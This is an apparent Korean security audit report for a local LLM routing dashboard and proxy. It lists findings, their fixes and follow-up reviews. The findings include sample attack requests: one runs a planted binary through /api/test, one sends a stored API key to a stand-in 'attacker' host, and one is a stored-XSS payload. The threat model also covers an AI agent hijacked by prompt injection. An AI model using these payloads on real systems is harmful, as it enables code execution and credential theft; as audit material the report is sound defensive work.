# 보안 취약점 점검 (2026-11-01)

- 기준 커밋: `c4d0eb5` (`main`, `origin/main`과 동일)
- 범위: 런타임 소스 18개 파일 전부 — Python 10개(`routeDashboard.py`, `openrouterAdvisor.py`, `cliBackend.py`, `routeConfig.py`, `blackbox.py`, `usage_ledger.py`, `routeCli.py`, `localProcessTree.py`, `modelQualityProbe.py`, `blackbox_hook.py`), Node 1개(`claudeRouteProxy.mjs`), PowerShell 7개(런처·시작 스크립트), `docs/SECURITY.ko.md`의 방어 주장. 대시보드 내장 HTML/CSS/JS(약 130KB) 포함.
- 방법: 정적 전수 검토(프록시 2,011줄, 대시보드 4,476줄, 런처 1,422줄 등) + 실행 중 대시보드(`127.0.0.1:8787`)에 대한 **비파괴 실측** + 코드 경로 추적 + 기존 회귀 테스트·문서 대조
- 하지 않은 것: 외부 침투 테스트, 퍼징, 의존성 스캔(런타임 의존성 0개), 실제 공격자 계정을 이용한 다중 사용자 실험, 파괴적 요청(설정 저장·프로세스 종료·실행 파일 생성) 없음
- 위협 모델: (a) 같은 PC의 다른 로컬 사용자·프로세스, (b) 사용자 브라우저에서 열린 악성 웹페이지(CSRF·DNS 리바인딩), (c) 오염된 상류 모델/프록시 응답, (d) 프롬프트 인젝션으로 셸을 얻은 에이전트(프록시 토큰 보유), (e) 사용자가 신뢰할 수 없는 URL/설정값을 넣는 경우

## 1. 결론

- **원격(비로컬)에서 도달 가능한 취약점은 없다.** 프록시·대시보드·CLI shim·블랙박스 훅은 모두 루프백에만 바인딩된다. CORS 헤더가 없어 브라우저의 교차 출처 읽기도 막힌다.
- **단일 사용자 PC 기준 High 1건(대시보드 토큰 공개 → 쓰기 경계 붕괴), Medium 5건, Low 다수.**
- **공용/다중 사용자 PC에서는 High 1건이 즉시 악용 가능한 권한 상승(RCE·키 유출)으로 이어진다.** 다른 로컬 사용자가 공개 페이지에서 토큰을 읽고 `/api/test`로 임의 실행 파일을 구동하거나 저장된 Local 키를 공격자 주소로 보낼 수 있다.
- `docs/SECURITY.ko.md`의 핵심 방어(상수시간 토큰 비교, Host/Origin 검사, 리다이렉트 거부, 자격증명 세척, YAML 서브셋, Job Object, PID+생성시각 신원 확인)는 **코드와 일치**한다. 다만 7개 문구가 코드와 어긋난다(5절).
- 이번 점검에서는 **코드를 수정하지 않았다.** 수정은 7절 우선순위대로 별도 진행을 권한다.

## 2. 실측 확인 (실행 중 대시보드, 비파괴)

| 점검 | 결과 | 의미 |
| --- | --- | --- |
| 무토큰 `GET /` | 200, 페이지에 32자 토큰 포함 | 읽기 공개 + **토큰 공개** (D1) |
| `Host: evil.example` | 403 `host_rejected` | DNS 리바인딩 차단 확인 |
| 무토큰 `GET /api/config` | 403 `token_required` | 설정 조회 보호 확인 |
| 무토큰 `POST /api/config` | 403 `token_required` | 쓰기 보호 확인 |
| 토큰 + `Origin: http://evil.example` | 403 `origin_rejected` | CSRF 1차 방어 확인 |
| 토큰 + Origin 없음 | 400 `unknown_provider` (인증·Origin 통과) | **비브라우저 요청은 Origin 없이 쓰기 가능** (L4) |
| 토큰 + 잘못된 JSON / 배열 | 400 `invalid_json` / `invalid_payload` | 입력 검증 확인 |
| `/api/../api/status`, `%2e%2e` | 404 | 경로 정규화 확인 |
| 무토큰 `GET /api/snapshot` | 200, 키·경로 없음 | 공개 읽기 범위는 대체로 문서대로 |
| 무토큰 `GET /api/status` | 200, **절대 `route_log` 경로·설정 모델 노출** | F10 |
| 무토큰 `GET /api/diagnostics` | 200, `sk-*`·`Bearer`·절대경로 없음 | 진단 응답 무해 확인 |
| `HEAD /api/status` | 501 | 기능 결함(보안 영향 없음) |
| `OPTIONS /api/config` | 405 | CORS 프리플라이트 불허 확인 |

## 3. 발견 상세

### D1. (High · 다중 사용자 PC / Medium · 단일 사용자 PC) 대시보드 "세션 토큰"이 무인증 페이지에 포함 — 쓰기 인증 경계가 성립하지 않음

- 근거: 페이지 4종(`/`, `/settings`, `/usage`, `/blackbox`)을 **인증 없이** 내려주면서 `__DASHBOARD_TOKEN__`을 세션 토큰으로 치환한다(`routeDashboard.py:3711-3718`). 쓰기 API는 그 토큰만 확인한다(`:3804-3810`, `:3828-3829`). 실측으로 무토큰 `GET /`에서 32자 토큰을 그대로 얻었다. 테스트도 이 동작을 의도된 사양으로 고정한다(`tests/test_route_dashboard.py`의 페이지 토큰 테스트).
- 문제: 루프백 포트는 사용자별로 격리되지 않는다. **같은 PC의 다른 사용자/프로세스도 페이지를 읽어 토큰을 얻고 `/api/config`, `/api/config-reset`, `/api/default-provider`, `/api/blackbox`, `/api/test`를 모두 호출할 수 있다.** `SECURITY.ko.md` §2는 토큰을 쓰기 통제로, §7.1은 "토큰이 없으면 읽기(대시보드)는 가능"이라고 서술하지만 실제로는 토큰도 공개된다.
- 파급 1 — **임의 실행 파일 구동(RCE)**: 아래 D2.
- 파급 2 — **저장된 Local API 키 유출**: 아래 D3.
- 파급 3 — 설정 변조·초기화, 블랙박스 상세 녹음 무단 시작, 기본 제공자 변경.
- 수정: (1) 페이지 HTML에 토큰을 심지 말 것 — 런처가 1회용 URL(또는 사용자 프로필 ACL 파일)로 전달하고 브라우저는 fragment/메모리에만 보관, (2) 쓰기는 HttpOnly·SameSite=Strict 세션 쿠키 + Origin 검사로 전환, (3) 다중 사용자 PC에서는 대시보드를 띄우지 않는다는 경고를 문서·UI에 명시, (4) 가능하면 루프백 HTTP 대신 사용자 DACL이 걸린 named pipe로 전환.
- 검증: 코드 + 실측으로 확인. 다른 사용자 계정에서의 실제 공격은 실행하지 않았다(단일 사용자 세션).

### D2. (High · 다중 사용자 PC) `/api/test`가 게시된 `values`로 **임의 경로의 실행 파일을 실행**

- 근거: `POST /api/test`는 저장하지 않은 폼 값을 받는다(`routeDashboard.py:3928-3932`). `run_connection_test`가 그 값을 저장값과 병합하고(`:2524`), CLI 경로에서는 `_cli_test` → `_cli_detection` → `routeCli.detect_all` → `find_binary(pinned)` → **`probe_version`이 `--version`으로 실행**한다(`routeCli.py:246-250`, `:263-280`, `:168-187`). `routeCli.validate_binary`는 절대 경로·basename 일치·확장자·존재·비심링크만 확인하고(`routeCli.py:44-62`) 신뢰 디렉터리·서명 검사는 없다. **버전 수용 여부와 무관하게 먼저 실행된다.**
- 시나리오: 다른 로컬 사용자가 `C:\Users\Public\claude.cmd`(또는 `codex.exe` 등)를 심고, 공개 페이지에서 얻은 토큰으로 `POST /api/test {"provider":"cli","mode":"metadata","values":{"CLI_KIND":"claude","CLI_BINARY":"C:\\Users\\Public\\claude.cmd"}}`를 보낸다. 대시보드 사용자 권한으로 공격자 코드가 실행된다. 추론 모드(`mode:"inference"`)는 고정 프롬프트로 CLI를 완전히 구동한다. 자식 프로세스의 env 허용목록은 무의미하다(자식이 직접 `%USERPROFILE%\.claude`·설정 파일을 읽는다).
- 수정: `/api/test`는 **저장된 값만** 사용(이미 `tool_roundtrip` 모드는 그렇게 한다, `:3924`), CLI 바이너리는 알려진 설치 디렉터리로 고정, 임의 경로 거부, 필요하면 서명/해시 허용목록.
- 검증: 코드 경로 확인(정적). 실제 악성 바이너리 실행은 하지 않았다.

### D3. (High/Medium) `/api/test`에 게시한 URL로 **저장된 Local API 키가 전송**됨

- 근거: `_effective_values`는 빈 비밀값을 저장값으로 유지하면서 게시된 `LOCAL_LLM_URL`은 덮어쓴다(`routeDashboard.py:2188-2205`). 이후 `run_connection_test`가 `values.get("LOCAL_LLM_API_KEY")`를 `Authorization: Bearer`로 붙여 게시된 URL로 보낸다(`:2561-2594`). `_validate_local`은 `LOCAL_LLM_ALLOW_REMOTE=true`면 임의 HTTPS 호스트를 허용하고, `:2053`의 `internal = scheme=="http" and http_url and url == http_url` 덕분에 **두 URL 필드를 같은 평문 HTTP 주소로 게시하면 원격 허용 없이도** 통과한다.
- 시나리오: 토큰 보유자가 `POST /api/test {"provider":"local","mode":"inference","values":{"LOCAL_LLM_URL":"http://attacker/v1/messages","LOCAL_LLM_HTTP_URL":"http://attacker/v1/messages","LOCAL_LLM_MODEL":"x"}}` → 저장된 키가 공격자에게 전송. HTTPS+ALLOW_REMOTE 조합도 동일. 인트라넷/링크로컬 SSRF도 가능.
- 수정: **게시된 URL과 저장된 비밀값을 절대 결합하지 말 것**(URL을 게시하면 키는 게시된 값만 사용), "내부 HTTP 예외"를 루프백/사설 대역으로 제한(`ipaddress`), URL 검증과 비밀값 사용을 한 함수에서 함께 결정.
- 검증: 코드 경로 확인. 실제 키 전송은 하지 않았다(합성 값으로만 경로 확인).

### D4. (Medium) 대시보드 HTTP 서버에 헤더/본문 읽기 타임아웃·연결 상한이 없음 — **무인증** 로컬 DoS

- 근거: `BaseHTTPRequestHandler.timeout`은 기본 `None`(실측), 헤더 단계와 `rfile.read(length)`(`routeDashboard.py:3850`)에 기한이 없다. `ThreadingHTTPServer`를 상한 없이 사용한다(`:3938-3946`). 서브에이전트 실측에서 15개 반열림 요청이 스레드 15개를 추가로 점유했고 서버는 계속 응답했다.
- 시나리오: **토큰이 필요 없는** 로컬 프로세스가 소켓 수백 개를 열고 요청 라인/헤더를 조금만 보내면 스레드·FD가 고갈되어 대시보드 읽기·쓰기가 지연/실패한다.
- 수정: `Handler.timeout = 30`, 헤더 크기 상한, 동시 연결 세마포어, `request_queue_size` 조정.

### D5. (Medium) 프록시: 동시 32MiB 버퍼에 전역 상한이 없음 — 토큰 보유자 메모리 고갈

- 근거: `MAX_RESPONSE = 32MiB`(`claudeRouteProxy.mjs:284`), 청크를 모두 모아 `Buffer.concat`(`:1287-1298`), 외부 요청은 `JSON.stringify`로 한 번 더 복사(`:1663`). `localConcurrency`는 local provider에만, `cliActivity.limit`는 관측용, `inflight`는 카운터일 뿐 게이트가 아니다(`:865`, `:969`, `:1129`, `:1618`).
- 시나리오: 프록시 토큰 보유자(Claude Code가 띄운 셸은 env로 토큰을 갖는다)가 32MiB 본문 4~8개를 동시에 보내면 요청당 최대 ~96MiB가 살아 있어 프록시가 OOM으로 죽는다.
- 수정: 메시지 요청 동시성 세마포어, 전역 바이트 예산, 초과 시 조기 429/503, `count_tokens`는 더 작은 상한.

### D6. (Medium) 프록시: slow-drip 업로드가 in-flight 턴을 고정해 핸드오버·업그레이드를 막음

- 근거: idle 타이머를 청크마다 재무장하고 **절대 기한이 없다**(`claudeRouteProxy.mjs:1263-1295`). 드레인은 `while (inflight > 0 …)`로 기다리다 상한에서 409로 되돌린다(`:1143-1148`).
- 시나리오: 30초보다 짧은 간격으로 1바이트씩 보내는 클라이언트는 몇 시간이고 턴을 유지할 수 있고, 그동안 모든 `POST /api/handover`가 409가 되어 프록시 교체가 불가능하다. `SECURITY.ko.md` §4의 "slowloris로 드레인이 막히지 않게 함"과 어긋난다.
- 수정: 요청 전체 절대 기한 추가, 드레인 상한 도달 시 revert만 하지 말고 연결을 강제 종료/503.

### D7. (Medium) 대시보드 저장형 XSS — 경로 로그의 `last_model`이 이스케이프 없이 innerHTML에 삽입됨

- 근거: `route_selected` 이벤트의 `model`을 최대 200자까지 `last_model`로 보관하고(`routeDashboard.py:550-557`), `connectionSummary`가 `` ` ${row.last_model}` ``로 문자열을 만들며(`:3414`), 이 값이 `kv()`(값을 이스케이프하지 않는 헬퍼, `JS_SHARED` `:2940`)를 통해 innerHTML에 들어간다(`:3422`). `esc()` 자체는 정확하지만 이 호출부가 "값은 이미 이스케이프됨"이라는 `kv` 계약을 깬다.
- 시나리오: `.route.log`에 `{"event":"route_selected","provider":"local","reason":"replacement","model":"<img src=x onerror=...>"}` 줄이 있거나, `LOCAL_LLM_MODEL`에 HTML을 넣어(로컬 모델 검증은 C0 제어문자만 거부, `:2059-2061`) 프록시가 그대로 로그하면(`claudeRouteProxy.mjs:1670`), 대시보드를 연 브라우저에서 스크립트가 실행된다. XSS는 같은 페이지의 `TOKEN`을 읽어 API를 호출할 수 있다. **전제: 로컬 파일 쓰기 또는 설정 저장 권한.**
- 수정: `esc(row.last_model)`, 로그 모델도 프록시의 모델 정규식으로 검증, `kv`/`strip`의 raw 계약을 문서화하거나 raw 헬퍼를 별도 이름으로 분리.
- 검증: 서브에이전트가 in-memory로 `<img src=x onerror=alert(1)>`가 `routing_state()`를 통과함을 확인. 실제 브라우저 실행은 하지 않았다.

### D8. (Medium/Low) 값비싼 GET·CLI 프로브가 스로틀되지 않음

- 근거: 레이트리밋은 POST에만 적용된다(`routeDashboard.py:3830`). `GET /api/models?refresh=1`은 호출마다 상류 모델 목록을 가져오고(`:3733-3750`), `/api/test`는 30/분 제한이지만 single-flight가 아니어서 동시 CLI 프로브/추론 테스트가 가능하다(직렬화는 `tool_roundtrip`만, `:2442`, `:2477`).
- 시나리오: 토큰 보유자가 refresh를 반복하거나 테스트를 동시에 걸어 스레드·대역폭·제공자 크레딧을 소모시킨다.
- 수정: GET refresh 레이트리밋, 엔드포인트별 single-flight, 프로브 전역 직렬화.

### Low / Info

| ID | 내용 | 근거 |
| --- | --- | --- |
| L1 | 프록시 리스너에 연결 상한 없음(`maxConnections`/`maxRequestsPerSocket`/keep-alive 미설정) → 무토큰 소켓 고갈 | `claudeRouteProxy.mjs:1180`, `:1944-1947` |
| L2 | 프록시 응답에 문서 §3의 보안 헤더가 없음(403/hello/metrics) | `:1181-1189`, `:1191`, `:1224-1227` |
| L3 | 상류 오류 본문 512B가 `.route.log`에 남음 → "본문 미기록"과 불일치 | `:1552`, `:183` |
| L4 | Origin 없는 POST 허용 → 문서 §2 "동일 출처일 때만"과 불일치(토큰은 필수라 CSRF는 아님) | `routeDashboard.py:3833-3839` |
| L5 | takeover가 포트 해제 후 재바인딩 → 로컬 포트 스쿼트 시 기존 CLI의 Plan OAuth·프롬프트 노출 | `openrouterAdvisor.py:913-916`, `:706-707` |
| L6 | 프록시 nonce가 local/compat 모드 자식 `--settings` argv와 `.session-handoff.json`에 평문 → 문서 §2 "핸드오프에 자격증명 없음"과 불일치 | `openrouterAdvisor.py:1118-1138`, `:401-410`, `:870` |
| L7 | CLI shim이 인증 확인 **전에** 연결 슬롯 선점 → 무토큰 유휴 소켓 DoS | `cliBackend.py:542-545`, `:497-500` |
| L8 | `--print` 프롬프트가 argv로 전달(프로세스 목록 노출, `-` 시작 시 옵션 재해석 가능) | `openrouterAdvisor.py:1079` |
| L9 | Local 설정에서 환경변수가 파일값을 덮어씀 → 대시보드 마스킹 우회, 키가 다른 주소로 감 | `openrouterAdvisor.py:160-161` |
| L10 | `claude`/`node` 해석 불일치 — `resolve_command`가 native_args 있을 때만 적용, PATH `.cmd` 경로 잔존 | `openrouterAdvisor.py:1140`, `:1167` |
| L11 | `/api/config` 마스킹이 비밀값 앞 6자·뒤 4자를 노출, 문서 §2 "응답에 절대 포함하지 않음"과 불일치 | `routeDashboard.py:1946-1949` |
| L12 | 공개 `/api/status`가 절대 `route_log` 경로·설정 모델 노출, 문서 §2의 읽기 범위 서술과 불일치 | `routeDashboard.py:4380-4395`(실측) |
| L13 | Host 허용목록 관대함 — `Host` 누락 허용, 포트 절단, `[::1]evil` 통과(브라우저 악용 불가) | `:3968-3978` |
| L14 | 블랙박스 상세 녹음이 동의 없이 시작 가능(토큰 보유자), 대화 원문 저장이 보안 문서에 미기재 | `:3855-3871`, `blackbox.py` |
| L15 | `write_json_state` 비원자 폴백이 symlink 추종, `.dashboard.pid` 등 로컬 파일 symlink/TOCTOU(Windows는 권한 필요) | `openrouterAdvisor.py:378`, `routeDashboard.py:3994`, `:4034-4071` |
| L16 | 로그 인젝션 가능성: 세척이 개행 미제거, 파일 미러가 raw args 기록, 파서가 임의 `{json}` 라인 수용(현재 내부 호출자는 사전 세척) | `claudeRouteProxy.mjs:178-186`, `routeDashboard.py:184-205` |
| Info | `costStatusSuffix`가 `status`를 raw innerHTML에 삽입(현재 고정 enum이라 악용 불가), CSP 없음, `DASHBOARD_TOKEN` 비ASCII 시 비교 예외, usage ledger는 파라미터화(SQLi 없음) | `routeDashboard.py:2942` |

## 4. 방어가 유효함을 확인한 항목

- 프록시: 모든 경로(`/v1/messages`, `/api/metrics`, `HEAD /api/hello`, `POST /api/handover`) 토큰 필수, SHA-256+`timingSafeEqual`, 중복 토큰 헤더 403, 경로·쿼리 화이트리스트(`beta=true`만), `Content-Length`+`Transfer-Encoding` 400, `__proto__`/`constructor` 프로토타입 오염 없음, 상류로 클라이언트 자격증명 비전달, 모든 fetch `redirect:'error'`, 모델 allowlist, 스트림 검증(thinking 차단).
- 대시보드: Host/Origin/토큰/레이트리밋, 경로 순회 404, JSON 객체만, 64KB 본문 상한, 마스킹된 설정만 응답, 리다이렉트 미추종 + 루프백/HTTPS 검증, PID+생성시각 불일치 시 신호 거부, DNS 리바인딩 차단(실측 403).
- 런처/CLI: `shell=True`·`os.system`·`eval` 없음, CLI 진단은 고정 argv·허용목록 env·파일 기반 출력·크기/시간 상한·kill-on-close Job Object, YAML 부분집합이 중복 키/앵커/탭/제어문자 거부, 저장은 락+임시파일+원자 교체, 백업 0600.
- 블랙박스/사용량: 후크는 고정 스크립트, 사용량 SQL은 파라미터화.

## 5. `docs/SECURITY.ko.md` 주장 vs 코드

> 아래 ❌/⚠️ 항목은 10절 조치와 함께 문서를 정정했습니다. 표는 **점검 시점(조치 전)** 판정입니다.

| 문서 주장 | 판정 | 근거 |
| --- | --- | --- |
| §3 모든 응답에 no-store/nosniff/Referrer-Policy/X-Frame-Options | ❌ 프록시는 아님 (대시보드는 O) | L2 |
| §4 30초 idle 타임아웃으로 slowloris가 드레인을 막지 못함 | ❌ slow-drip은 막지 못함 | D6 |
| §5 잠금 파일을 열 수 없으면 "잠금 없이 진행" | ❌ 코드는 `config_busy`로 **실패**(더 안전) | `routeConfig.py:520-527` |
| §2 핸드오프 기록에 "자격증명 없음" | ❌ 프록시 nonce 포함 | L6 |
| §5 로그에 키·프롬프트·본문을 남기지 않음 | ❌ 상류 오류 excerpt 512B | L3 |
| §2 쓰기는 "동일 출처(Origin)"일 때만 | ❌ Origin 없는 요청 허용(토큰은 필수) | L4 |
| §2 읽기에는 `providers`·`active_session`만 포함 | ❌ `/api/status`에 절대 경로·모델 포함 | L12 |
| §2 쓰기 토큰은 인가 경계 | ⚠️ **경계 아님** — 페이지가 토큰 공개 | D1 |
| §2 프록시 토큰 상수시간 비교·전 경로 필수 | ✅ | `claudeRouteProxy.mjs:884-885`, `:1190` |
| §2 핸드오버 503+Retry-After·120초 상한·409 revert | ✅ | `:1136-1179`, `:1218-1223` |
| §4 32MiB 본문·필드 화이트리스트 | ✅ | `:284`, `:445` |
| §5 상류 오류 64KiB 상한·취소, 오류 본문 세척 | ✅ | `:1544-1555` |
| §2 대시보드 Host 허용목록·DNS 리바인딩 차단 | ✅(관대함 L13) | `routeDashboard.py:3965-3978`, 실측 403 |
| §2 쓰기 토큰·Origin·분당 30회 제한 | ✅ 구현(단 D1·L4) | `:3822-3839`, `:3949-3962` |
| §5 YAML 서브셋·원자적 저장·백업 0600·제어문자 거부 | ✅ | `routeConfig.py:592-600` 등 |
| §2 CLI 진단: 셸 미사용·env 허용목록·출력 캡·Job Object·UNC/심링크 거부 | ✅ (런처 본체 경로는 L10, 임의 핀 경로는 D2) | `routeCli.py`, `localProcessTree.py` |
| §2 대시보드 종료 pid+생성시각 신원 | ✅ | `routeDashboard.py:3987-4009` |

## 6. 심각도 요약

| 심각도 | 건수 | 항목 |
| --- | --- | --- |
| High (다중 사용자 PC) | 1 (+2 파급) | D1 토큰 공개 경계 붕괴 → D2 RCE, D3 키 유출 |
| Medium | 5 | D4 무인증 slowloris, D5 프록시 메모리 DoS, D6 드레인 차단, D7 저장형 XSS, D8 값비싼 엔드포인트 스로틀 없음 |
| Low | 16 | L1~L16 |
| Info | 4 | costStatusSuffix sink, CSP 부재, 토큰 비교 예외, 로그 파서 위조 |

## 7. 우선순위 권고

1. **D1** — 페이지 내 토큰 노출 구조 제거. 공용 PC에서는 즉시 High(권한 상승).
2. **D2·D3** — `/api/test`는 저장값만 허용 + CLI 바이너리 설치 경로 고정, 게시 URL과 저장 비밀값 결합 금지(내부 HTTP 예외는 루프백/사설 대역만).
3. **D4·D5·L1·L7** — 대시보드/프록시/CLI shim의 연결·메모리 상한.
4. **D6** — 업로드 절대 기한 추가로 핸드오버 차단 방지.
5. **D7·L3** — `last_model` 이스케이프, 모델 정규식 검증, excerpt 제거, `.route.log` 0600.
6. **L5·L6** — takeover 포트 핸드오프, nonce argv/핸드오프 노출 제거.
7. **문서 정정** — 5절의 8개 문구.
8. (선택) 블랙박스 보존/삭제 정책, CSP 도입 검토.

## 8. 재현 방법

```powershell
# 실측 스크립트(저장소 밖 임시 파일): Host/Origin/토큰/경로 순회 확인
python C:\Users\magic\AppData\Local\Temp\live_sec_checks.py

# 회귀: 인증·Host·프록시 격리·관측성
python -m unittest tests.test_route_dashboard
node --test tests/claudeRouteProxy.test.mjs tests/observability.test.mjs tests/streaming.test.mjs
```

## 9. 점검 범위 밖 / 남은 확인

- 다른 Windows 사용자 계정에서의 실제 공격 재현(포트 스쿼트, 페이지 토큰 탈취, CLI_BINARY 실행, Local 키 유출) — 단일 사용자 세션 제약으로 코드 경로만 확인.
- 실제 OpenRouter/로컬 백엔드가 오류 본문에 요청 텍스트를 에코하는 빈도(L3 심각도).
- Windows ACL(`.session-handoff.json`, `.blackbox/`, `.route.log`)이 실제 배포 경로에서 다른 사용자에게 읽히는지.
- OOM 임계값, 프록시 스트림 passthrough의 Claude Code 파서 호환성.

## 10. 조치 결과 (2026-11-01, 이 보고서 이후)

| 발견 | 조치 | 상태 |
| --- | --- | --- |
| D1 페이지 토큰 노출 | 토큰을 페이지 HTML에서 제거하고 시작 시 출력하는 `write_url`의 `#token=…` 프래그먼트로만 전달. 페이지 JS가 해시에서 읽은 뒤 `history.replaceState`로 주소창에서 제거하고 그 탭의 `sessionStorage`(탭 범위)에 보관해 화면 이동·새로고침을 견딤. 토큰 없는 페이지는 읽기 전용 + 안내 배너, 쓰기는 `token_required` | 해결 |
| D2 `/api/test` 게시 값으로 임의 실행 파일 구동 | `/api/test`의 게시 값 중 모델 ID·타임아웃만 반영. `CLI_BINARY`·`CLI_KIND`는 저장값만 사용 | 해결 |
| D3 게시 URL + 저장 키 결합 | `LOCAL_LLM_URL`·`LOCAL_LLM_HTTP_URL`·`LOCAL_LLM_API_KEY`는 게시 값에서 제외(저장값만 사용) | 해결 |
| D4 대시보드 타임아웃·연결 상한 없음 | `Handler.timeout = 15`, `request_queue_size` 64, 데몬 스레드, **동시 연결 64개 상한**(초과 소켓은 스레드 없이 즉시 종료) | 해결 |
| D5 프록시 동시 32MiB 버퍼 | 동시 요청 32개(기본)(`ROUTE_MAX_CONCURRENT_REQUESTS`)·진행 중 본문 64MiB(`ROUTE_MAX_INFLIGHT_BYTES`) 상한, 초과 시 429/503 + `Retry-After` | 해결 |
| D6 slow-drip 업로드 고정 | 본문 업로드 절대 기한 60초(`ROUTE_REQUEST_TOTAL_TIMEOUT_MS`) 추가, 초과 시 `client_body_total_timeout` | 해결 |
| D7 저장형 XSS | `connectionSummary`에서 `last_model`을 `esc()`로 이스케이프 | 해결 |
| D8 값비싼 GET·프로브 무제한 | `GET /api/models?refresh=1` 분당 6회, `/api/test` 동시 1개(`test_busy`) | 해결 |
| L1 연결 상한 | `server.maxConnections=64`(`ROUTE_MAX_CONNECTIONS`), keep-alive 5초 | 해결 |
| L2 프록시 보안 헤더 | 거부 응답·`/api/hello`·`/api/metrics`에 no-store/nosniff/no-referrer/X-Frame-Options | 해결 |
| L3 오류 발췌 로그 | `upstream_error_redacted`에서 excerpt 제거(길이만), `.route.log` 미러도 세척 경유 | 해결 |
| L4 Origin 없는 POST | 위험은 토큰 필수라 CSRF 아님. 문서에 "Origin 없으면 토큰+Host만"으로 정정 | 문서 정정 |
| L6 핸드오프 nonce·argv | 문서 §2의 "자격증명 없음"을 "nonce 포함, 파일 권한 경계"로 정정(코드 유지) | 문서 정정 |
| L7 shim 선점 DoS | 헤더 타임아웃 10초로 점유 시간 제한(구조 변경은 보류) | 부분 완화 |
| L9 env 덮어쓰기 | 동작 유지, 위험으로 문서화 | 문서 정정 |
| L11 마스킹 6+4자 | 마스킹은 UI 편의를 위한 것이며 비밀값 앞부분 노출은 문서화 | 문서 정정 |
| L12 status 경로·모델 노출 | 공개 읽기 범위를 문서에 명시 | 문서 정정 |
| L14 블랙박스 동의 | 상세 기록은 옵트인·마스킹·크기 상한이라는 점과 기록 파일을 비밀값처럼 다뤄야 한다는 점을 문서화 | 문서 정정 |
| L16 로그 인젝션 | `.route.log` 미러에서 삽입 개행을 공백으로 치환해 한 이벤트가 추가 줄을 위조하지 못하게 함 | 해결(미러) |
| L8 `--print` 프롬프트 argv 노출 | `-p` 프롬프트를 argv에서 빼고 표준 입력으로 전달(`run_cli`, `--input-format text` 기본). 단위 테스트로 argv에 없음·stdin에 있음 확인 | 해결 |
| L5 포트 스쿼트, L10 CLI 해석, L15 symlink | 이번 조치 범위 밖 — 잔여 위험으로 유지 | 미해결 |

검증: `node --test tests/*.test.mjs` → **708 pass / 0 fail**, Python은 **665개 수집(11 skip)** 중 실행된 654개에서 **653 pass + 1 flaky fail**. flaky는 `test_route_cli.test_reasons_through_shim`(부하 시 node 스폰이 4초 상한을 넘어 시간 초과)이며, 같은 테스트를 20초 상한으로 실행하면 통과합니다. `routeCli.py`·`localProcessTree.py`는 이번 변경에 포함되지 않았습니다. 대시보드 모듈 단독은 241 pass.

## 11. 2차 검토 (2026-11-01, 조치 이후)

조치 결과를 다시 검토해 다음을 찾아 수정했습니다.

| 항목 | 내용 | 상태 |
| --- | --- | --- |
| 토큰 유지 회귀 | 프래그먼트를 주소창에서 지운 뒤에는 화면 이동·새로고침 시 토큰이 사라져 쓰기가 막히는 문제. 세션 범위 `sessionStorage`에 보관해 같은 탭의 이동·새로고침을 견디고, 탭을 닫으면 사라지게 함(다른 탭·프로세스는 읽기 전용) | 수정 |
| 대시보드 스레드 상한 | 연결마다 스레드가 생기는 구조에 동시 연결 64개 상한을 추가. 초과 연결은 새 스레드 없이 소켓을 닫음 | 수정 |
| 미러 로그 인젝션 | `.route.log` 미러에 값 속 개행이 그대로 들어가 추가 이벤트 줄을 위조할 수 있던 문제. 개행을 공백으로 치환 | 수정 |
| 속도 제한 경합 | `ThreadingHTTPServer`에서 분당 창 갱신이 원자적이지 않아 동시 요청 시 한도가 조금 넘을 수 있던 문제. 락으로 직렬화 | 수정 |
| 문서 | `write_url`·`sessionStorage` 동작, 탭 종료/대시보드 재시작 시 토큰 수명, 토큰이 콘솔·브라우저 인자에 남을 수 있다는 점, 블랙박스 동의·로그 한 줄 보장을 `SECURITY.ko.md`·README에 반영 | 문서 정정 |
| 벤치마크 하네스 상한 | `--soak-concurrency`를 8보다 크게 주거나 `simulate.mjs`의 기본 동시성(24)으로 실행하면 동시성 상한에 걸려 429가 섞일 수 있던 문제. `bench_proxy.mjs`(워커 env)와 `simulate.mjs`(createProxy 옵션)에서만 상한을 높여 라우팅 처리량을 측정하도록 수정 | 수정 |

## 12. 3차 검토 (2026-11-01, 잔여 후보 처리)

2차 검토에서 남긴 후보를 처리했습니다.

| 항목 | 내용 | 상태 |
| --- | --- | --- |
| 동시 요청 기본값 | 병렬 서브에이전트가 9개 이상이면 429가 나던 기본값 8을 32로 올림(연결 상한 64 미만 유지, env로 조정 가능). 기본값을 메트릭으로 고정하는 테스트 추가 | 수정 |
| stale 토큰 UX | 대시보드 재시작으로 무효가 된 토큰을 들고 있으면 저장이 조용히 실패하던 문제. 403 `token_required`를 받으면 해당 탭의 `sessionStorage`를 비우고 안내 배너를 다시 표시 | 수정 |
| L8 `--print` 프롬프트 | 프롬프트를 argv에서 빼고 표준 입력으로 전달(`run_cli`, `--input-format text` 기본). argv에 프롬프트가 없고 stdin으로 전달되는지 단위 테스트로 확인 | 해결 |
| 부하 flaky 테스트 | `test_route_cli`의 명령 상한 4초가 부하 시 정상 node 스폰까지 시간 초과시키던 문제. 15초로 올려 flaky 제거(느린 모드 검증은 유지) | 수정 |
| L5·L10·L15 | 포트 스쿼트, CLI 해석 불일치, symlink/TOCTOU는 구조적 잔여 위험으로 `SECURITY.ko.md` §7에 명시 | 문서화 |
| 실행 정책 진입점 | 설치 포워더·체크아웃 진입점을 `.cmd`로 바꿔 PowerShell 실행 정책(`AllSigned`)과 무관하게 실행. 설치 시 같은 이름의 구 `.ps1` 포워더를 제거해 PowerShell이 다시 `.ps1`을 우선 선택하지 않게 함 | 수정 |
| 토큰 오류 안내 | 대시보드 재시작으로 토큰이 바뀐 뒤 설정 페이지가 "새로고침"만 안내하던 문제. 403이면 `write_url`로 다시 접속하라는 구체적 안내로 교체 | 수정 |
| 토큰 재시작 유지 | 재시작마다 토큰이 바뀌어 열어 둔 설정 탭이 전부 무효화되던 문제. 토큰을 `.dashboard.token`(같은 사용자 파일, Git 제외)에 보관해 재시작 후에도 같은 탭이 동작. 교체는 파일 삭제 또는 `DASHBOARD_TOKEN`. CLI 감지 403도 구체적 안내로 교체 | 수정 |
| CLI 자동 검색 | 설정 화면 CLI 카드에 **CLI 자동 검색** 버튼 추가. `/api/cli` 감지 결과로 CLI 종류와 실행 파일 경로를 채움(지원 백엔드만, 임의 PATH 명령 검색 아님). 채운 값은 저장 버튼으로 확정. DOM 시뮬레이션(채움·고정 경로 보존·미설치·403)과 실서버 흐름(감지→저장→기본값→발행 설정) 테스트로 고정 | 기능 추가 |
